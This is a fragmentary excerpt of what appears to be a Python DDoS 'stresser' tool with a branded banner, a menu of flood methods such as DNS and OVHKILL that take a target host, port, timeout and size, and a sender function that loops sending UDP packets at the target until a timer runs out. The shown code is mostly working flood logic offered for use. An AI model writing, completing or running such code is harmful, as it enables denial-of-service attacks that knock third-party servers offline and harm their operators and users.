...
║ \033[00mDNS  <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m |\033[00m STD  ATTACK\033[91m 
  \033[00mOVHKILL  <HOST> <PORT> <TIMEOUT> <SIZE> \033[91m |\033[00m STD  ATTACK\033[91m 
...
banner = """\033[1;00m
 ...
 ꧁ঔৣ☬✞ P E I X O T O--M D Z Z ✞☬ঔৣ꧂
 ꧁ঔৣ☬✞ P E I X O T O--M D Z Z ✞☬ঔৣ꧂     \033[1;91m罪 深 い\033[00m
"""
...
def OVHKILLsender(host, port, timer, punch):
	global uaid
	global OVHKILL
	global aid
	global tattacks
	...
	aid += 1
	tattacks += 1
	while time.time() < timeout and OVHKILL and attack:
		sock.sendto(punch, (host, int(port)))
	uaid -= 1
	aid -= 1
...
if what == "OVHKILL":
				print ("Stopping all OVHKILL attacks")
				OVHKILL = False
				while not OVHKILL:
					print ("[\033[91mSIN\033[00m] No ICMP processes running")
					OVHKILL = True
